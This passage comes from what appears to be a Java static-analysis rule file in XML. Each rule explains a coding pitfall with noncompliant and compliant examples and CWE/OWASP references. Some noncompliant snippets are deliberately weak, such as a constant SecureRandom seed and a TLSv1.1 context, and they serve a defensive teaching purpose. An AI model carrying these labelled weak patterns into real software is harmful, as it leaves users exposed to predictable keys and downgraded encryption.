            &lt;p&gt;There's no need to null test in conjunction with an &lt;code&gt;instanceof&lt;/code&gt; test. &lt;code&gt;null&lt;/code&gt;
            is not an &lt;code&gt;instanceof&lt;/code&gt; anything, so
            a null check is redundant.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (x != null &amp;amp;&amp;amp; x instanceof MyClass) { ... } // Noncompliant

            if (x == null || ! x instanceof MyClass) { ... } // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (x instanceof MyClass) { ... }

            if (! x instanceof MyClass) { ... }
            &lt;/pre&gt;
        </description>
        <tag>redundant</tag>
    </rule>

    <rule key='S4274' priority='MAJOR'>
        <configKey>S4274</configKey>
        <name>Asserts should not be used to check the parameters of a public method</name>
        <description>
            &lt;p&gt;An &lt;code&gt;assert&lt;/code&gt; is inappropriate for parameter validation because assertions can
            be disabled at runtime in the JVM, meaning that a bad
            operational setting would completely eliminate the intended checks. Further, &lt;code&gt;assert&lt;/code&gt;s
            that fail throw &lt;code&gt;AssertionError&lt;/code&gt;s, rather
            than throwing some type of &lt;code&gt;Exception&lt;/code&gt;. Throwing &lt;code&gt;Error&lt;/code&gt;s is
            completely outside of the normal realm of expected
            &lt;code&gt;catch&lt;/code&gt;/&lt;code&gt;throw&lt;/code&gt; behavior in normal programs.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a &lt;code&gt;public&lt;/code&gt; method uses one or more of its
            parameters with &lt;code&gt;assert&lt;/code&gt;s.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void setPrice(int price) {
            assert price &amp;gt;= 0 &amp;amp;&amp;amp; price &amp;lt;= MAX_PRICE;
            // Set the price
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void setPrice(int price) {
            if (price &amp;lt; 0 || price &amp;gt; MAX_PRICE) {
            throw new IllegalArgumentException(&quot;Invalid price: &quot; + price);
            }
            // Set the price
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/7/docs/technotes/guides/language/assert.html&quot;&gt;Programming
            With Assertions&lt;/a&gt;&lt;/p&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S4275' priority='CRITICAL'>
        <configKey>S4275</configKey>
        <name>Getters and setters should access the expected fields</name>
        <description>
            &lt;p&gt;Getters and setters provide a way to enforce encapsulation by providing &lt;code&gt;public&lt;/code&gt;
            methods that give controlled access to
            &lt;code&gt;private&lt;/code&gt; fields. However in classes with multiple fields it is not unusual that copy
            and paste is used to quickly create the needed
            getters and setters, which can result in the wrong field being accessed by a getter or setter.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue in any of these cases:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; A setter does not update the field with the corresponding name. &lt;/li&gt;
            &lt;li&gt; A getter does not access the field with the corresponding name. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            private int x;
            private int y;

            public void setX(int val) { // Noncompliant: field 'x' is not updated
            this.y = val;
            }

            public int getY() { // Noncompliant: field 'y' is not used in the return value
            return this.x;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            private int x;
            private int y;

            public void setX(int val) {
            this.x = val;
            }

            public int getY() {
            return this.y;
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S4276' priority='MINOR'>
        <configKey>S4276</configKey>
        <name>Functional Interfaces should be as specialised as possible</name>
        <description>
            &lt;p&gt;The &lt;code&gt;java.util.function&lt;/code&gt; package provides a large array of functional
            interface definitions for use in lambda expressions and method
            references. In general it is recommended to use the more specialised form to avoid auto-boxing. For instance
            &lt;code&gt;IntFunction&amp;lt;Foo&amp;gt;&lt;/code&gt;
            should be preferred over &lt;code&gt;Function&amp;lt;Integer, Foo&amp;gt;&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when any of the following substitution is possible:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Current Interface&lt;/th&gt;
            &lt;th&gt;Preferred Interface&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Integer, R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;IntFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Long, R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;LongFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Double, R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;DoubleFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Double,Integer&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;DoubleToIntFunction&lt;/code&gt; &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Double,Long&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;DoubleToLongFunction&lt;/code&gt; &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Long,Double&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;LongToDoubleFunction&lt;/code&gt; &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;Long,Integer&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;LongToIntFunction&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;R,Integer&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ToIntFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;R,Long&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ToLongFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;R,Double&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ToDoubleFunction&amp;lt;R&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;T,T&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;UnaryOperator&amp;lt;T&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BiFunction&amp;lt;T,T,T&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;BinaryOperator&amp;lt;T&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Consumer&amp;lt;Integer&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;IntConsumer&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Consumer&amp;lt;Double&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;DoubleConsumer&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Consumer&amp;lt;Long&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;LongConsumer&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BiConsumer&amp;lt;T,Integer&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ObjIntConsumer&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BiConsumer&amp;lt;T,Long&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ObjLongConsumer&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BiConsumer&amp;lt;T,Double&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;ObjDoubleConsumer&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Predicate&amp;lt;Integer&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;IntPredicate&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Predicate&amp;lt;Double&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;DoublePredicate&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Predicate&amp;lt;Long&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;LongPredicate&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Supplier&amp;lt;Integer&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;IntSupplier&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Supplier&amp;lt;Double&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;DoubleSupplier&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Supplier&amp;lt;Long&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;LongSupplier&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Supplier&amp;lt;Boolean&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;BooleanSupplier&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;UnaryOperator&amp;lt;Integer&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;IntUnaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;UnaryOperator&amp;lt;Double&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;DoubleUnaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;UnaryOperator&amp;lt;Long&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;LongUnaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BinaryOperator&amp;lt;Integer&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;IntBinaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BinaryOperator&amp;lt;Long&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;LongBinaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BinaryOperator&amp;lt;Double&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;DoubleBinaryOperator&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;Function&amp;lt;T, Boolean&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;Predicate&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;BiFunction&amp;lt;T,U,Boolean&amp;gt;&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; &lt;code&gt;BiPredicate&amp;lt;T,U&amp;gt;&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements Supplier&amp;lt;Integer&amp;gt; { // Noncompliant
            @Override
            public Integer get() {
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements IntSupplier {

            @Override
            public int getAsInt() {
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S4347' priority='CRITICAL'>
        <configKey>S4347</configKey>
        <name>&quot;SecureRandom&quot; seeds should not be predictable</name>
        <description>
            &lt;p&gt;The &lt;code&gt;java.security.SecureRandom&lt;/code&gt; class provides a strong random number
            generator (RNG) appropriate for cryptography. However, seeding it
            with a constant or another predictable value will weaken it significantly. In general, it is much safer to
            rely on the seed provided by the
            &lt;code&gt;SecureRandom&lt;/code&gt; implementation.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;SecureRandom.setSeed()&lt;/code&gt; or &lt;code&gt;SecureRandom(byte[])&lt;/code&gt;
            are called with a seed that is either
            of:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; a constant &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;System.currentTimeMillis()&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            SecureRandom sr = new SecureRandom();
            sr.setSeed(123456L); // Noncompliant
            int v = sr.next(32);

            sr = new SecureRandom(&quot;abcdefghijklmnop&quot;.getBytes(&quot;us-ascii&quot;)); // Noncompliant
            v = sr.next(32);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            SecureRandom sr = new SecureRandom();
            int v = sr.next(32);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/330.html&quot;&gt;MITRE, CWE-330&lt;/a&gt;
            - Use of Insufficiently Random Values &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/332.html&quot;&gt;MITRE, CWE-332&lt;/a&gt;
            - Insufficient Entropy in PRNG &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/336.html&quot;&gt;MITRE, CWE-336&lt;/a&gt;
            - Same Seed in Pseudo-Random Number Generator (PRNG) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/337.html&quot;&gt;MITRE, CWE-337&lt;/a&gt;
            - Predictable Seed in Pseudo-Random Number Generator (PRNG) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded&quot;&gt;CERT,
            MSC63J.&lt;/a&gt; - Ensure that
            SecureRandom is properly seeded &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <tag>pitfall</tag>
        <securityStandards>
            <cwe>330,332,336,337</cwe>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4348' priority='MAJOR'>
        <configKey>S4348</configKey>
        <name>&quot;iterator&quot; should not return &quot;this&quot;</name>
        <description>
            &lt;p&gt;There are two classes in the Java standard library that deal with iterations: &lt;code&gt;Iterable&amp;lt;T&amp;gt;&lt;/code&gt;
            and &lt;code&gt;Iterator&amp;lt;T&amp;gt;&lt;/code&gt;. An
            &lt;code&gt;Iterable&amp;lt;T&amp;gt;&lt;/code&gt; represents a data structure that can be the target of the
            &quot;for-each loop&quot; statement, and an
            &lt;code&gt;Iterator&amp;lt;T&amp;gt;&lt;/code&gt; represents the state of an ongoing traversal. An &lt;code&gt;Iterable&amp;lt;T&amp;gt;&lt;/code&gt;
            is generally expected to support
            multiple traversals.&lt;/p&gt;
            &lt;p&gt;An &lt;code&gt;Iterator&amp;lt;T&amp;gt;&lt;/code&gt; that also implements &lt;code&gt;Iterable&amp;lt;t&amp;gt;&lt;/code&gt;
            by returning itself as its &lt;code&gt;iterator()&lt;/code&gt; will not
            support multiple traversals since its state will be carried over.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the &lt;code&gt;iterator()&lt;/code&gt; method of a class
            implementing both &lt;code&gt;Iterable&amp;lt;T&amp;gt;&lt;/code&gt; and
            &lt;code&gt;Iterator&amp;lt;t&amp;gt;&lt;/code&gt; returns &lt;code&gt;this&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class FooIterator implements Iterator&amp;lt;Foo&amp;gt;, Iterable&amp;lt;Foo&amp;gt; {
            private Foo[] seq;
            private int idx = 0;

            public boolean hasNext() {
            return idx &amp;lt; seq.length;
            }

            public Foo next() {
            return seq[idx++];
            }

            public Iterator&amp;lt;Foo&amp;gt; iterator() {
            return this; // Noncompliant
            }
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class FooSequence implements Iterable&amp;lt;Foo&amp;gt; {
            private Foo[] seq;

            public Iterator&amp;lt;Foo&amp;gt; iterator() {
            return new Iterator&amp;lt;Foo&amp;gt;() {
            private int idx = 0;

            public boolean hasNext() {
            return idx &amp;lt; seq.length;
            }

            public Foo next() {
            return seq[idx++];
            }
            };
            }
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S4349' priority='MINOR'>
        <configKey>S4349</configKey>
        <name>&quot;write(byte[],int,int)&quot; should be overridden</name>
        <description>
            &lt;p&gt;When directly subclassing &lt;code&gt;java.io.OutputStream&lt;/code&gt; or &lt;code&gt;java.io.FilterOutputStream&lt;/code&gt;,
            the only requirement is that you implement
            the method &lt;code&gt;write(int)&lt;/code&gt;. However most uses for such streams don't write a single byte
            at a time and the default implementation for
            &lt;code&gt;write(byte[],int,int)&lt;/code&gt; will call &lt;code&gt;write(int)&lt;/code&gt; for every
            single byte in the array which can create a lot of overhead and is
            utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient
            implementation of
            &lt;code&gt;write(byte[],int,int)&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a direct subclass of &lt;code&gt;java.io.OutputStream&lt;/code&gt;
            or &lt;code&gt;java.io.FilterOutputStream&lt;/code&gt; doesn't provide an
            override of &lt;code&gt;write(byte[],int,int)&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyStream extends OutputStream { // Noncompliant
            private FileOutputStream fout;

            public MyStream(File file) throws IOException {
            fout = new FileOutputStream(file);
            }

            @Override
            public void write(int b) throws IOException {
            fout.write(b);
            }

            @Override
            public void close() throws IOException {
            fout.write(&quot;\n\n&quot;.getBytes());
            fout.close();
            super.close();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyStream extends OutputStream {
            private FileOutputStream fout;

            public MyStream(File file) throws IOException {
            fout = new FileOutputStream(file);
            }

            @Override
            public void write(int b) throws IOException {
            fout.write(b);
            }

            @Override
            public void write(byte[] b, int off, int len) throws IOException {
            fout.write(b, off, len);
            }

            @Override
            public void close() throws IOException {
            fout.write(&quot;\n\n&quot;.getBytes());
            fout.close();
            super.close();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule doesn't raise an issue when the class is declared &lt;code&gt;abstract&lt;/code&gt;.&lt;/p&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S4351' priority='MAJOR'>
        <configKey>S4351</configKey>
        <name>&quot;compareTo&quot; should not be overloaded</name>
        <description>
            &lt;p&gt;When implementing the &lt;code&gt;Comparable&amp;lt;T&amp;gt;.compareTo&lt;/code&gt; method, the
            parameter's type has to match the type used in the
            &lt;code&gt;Comparable&lt;/code&gt; declaration. When a different type is used this creates an overload
            instead of an override, which is unlikely to be the
            intent.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the parameter of the &lt;code&gt;compareTo&lt;/code&gt; method of a
            class implementing &lt;code&gt;Comparable&amp;lt;T&amp;gt;&lt;/code&gt; is not
            same as the one used in the &lt;code&gt;Comparable&lt;/code&gt; declaration.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            static class Bar implements Comparable&amp;lt;Bar&amp;gt; {
            public int compareTo(Bar rhs) {
            return -1;
            }
            }

            static class FooBar extends Bar {
            public int compareTo(FooBar rhs) { // Noncompliant: Parameter should be of type Bar
            return 0;
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            static class Bar implements Comparable&amp;lt;Bar&amp;gt; {
            public int compareTo(Bar rhs) {
            return -1;
            }
            }

            static class FooBar extends Bar {
            public int compareTo(Bar rhs) {
            return 0;
            }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S4423' priority='CRITICAL'>
        <configKey>S4423</configKey>
        <name>Weak SSL/TLS protocols should not be used</name>
        <description>
            &lt;p&gt;This rule raises an issue when an insecure TLS protocol version is used (ie: a protocol different
            from &quot;TLSv1.2&quot;, &quot;TLSv1.3&quot;, &quot;DTLSv1.2&quot; or
            &quot;DTLSv1.3&quot;).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;javax.net.ssl.SSLContext&lt;/code&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            context = SSLContext.getInstance(&quot;TLSv1.1&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://square.github.io/okhttp/&quot;&gt;okhttp&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
            .tlsVersions(TlsVersion.TLS_1_1) // Noncompliant
            .build();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;javax.net.ssl.SSLContext&lt;/code&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            context = SSLContext.getInstance(&quot;TLSv1.2&quot;); // Compliant
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://square.github.io/okhttp/&quot;&gt;okhttp&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
            .tlsVersions(TlsVersion.TLS_1_2) // Compliant
            .build();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/326.html&quot;&gt;MITRE, CWE-327&lt;/a&gt;
            - Inadequate Encryption Strength &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/327.html&quot;&gt;MITRE, CWE-326&lt;/a&gt;
            - Use of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https&quot;&gt;Diagnosing
            TLS, SSL, and HTTPS&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols&quot;&gt;SSL
            and TLS Deployment Best
            Practices - Use secure protocols&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>327,326</cwe>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4425' priority='MAJOR'>
        <configKey>S4425</configKey>
        <name>&quot;Integer.toHexString&quot; should not be used to build hexadecimal strings</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;Integer.toHexString&lt;/code&gt; is a common mistake when converting sequences of
            bytes into hexadecimal string representations. The problem
            is that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value
            of &lt;code&gt;0x4508&lt;/code&gt; would be converted
            into &lt;code&gt;45&lt;/code&gt; and &lt;code&gt;8&lt;/code&gt; which once concatenated would give &lt;code&gt;0x458&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This is particularly damaging when converting hash-codes and could lead to a security
            vulnerability.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;Integer.toHexString&lt;/code&gt; is used in any kind of
            string concatenations.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            MessageDigest md = MessageDigest.getInstance(&quot;SHA-256&quot;);
            byte[] bytes = md.digest(password.getBytes(&quot;UTF-8&quot;));

            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) {
            sb.append(Integer.toHexString( b &amp;amp; 0xFF )); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            MessageDigest md = MessageDigest.getInstance(&quot;SHA-256&quot;);
            byte[] bytes = md.digest(password.getBytes(&quot;UTF-8&quot;));

            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) {
            sb.append(String.format(&quot;%02X&quot;, b));
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/704.html&quot;&gt;MITRE, CWE-704&lt;/a&gt;
            - Incorrect Type Conversion or Cast &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION&quot;&gt;BAD_HEXA_CONVERSION&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
    </rule>

    <rule key='S4426' priority='CRITICAL'>
        <configKey>S4426</configKey>
        <name>Cryptographic keys should be robust</name>
        <description>
            &lt;p&gt;Most of cryptographic systems require a sufficient key size to be robust against brute-force
            attacks.&lt;/p&gt;
            &lt;p&gt;&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf&quot;&gt;NIST
            recommendations&lt;/a&gt; will be checked for these
            use-cases:&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Digital Signature Generation&lt;/strong&gt; and &lt;strong&gt;Verification:&lt;/strong&gt;
            &lt;/p&gt;
